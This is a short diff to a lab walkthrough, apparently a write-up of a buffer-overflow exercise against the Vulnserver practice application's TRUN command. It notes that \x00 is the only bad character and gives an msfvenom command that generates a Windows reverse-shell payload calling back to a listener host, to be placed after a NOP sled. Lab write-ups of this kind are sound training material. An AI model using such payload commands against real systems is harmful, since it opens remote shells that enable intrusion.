@@ -128,6 +128,7 @@ expl.close()
 ![trun-eip-overwrite-media-06](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-06.png)
 
 From looking at the output, we can tell that there are no bad characters other than \x00. Generate a reverse shell using msfvenom and insert it into the Vulnserver TRUN Python Script and proceed it with a 15 character NOP sled.
+
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.83.122 LPORT=4444 -b "\x00" -f c
 ```
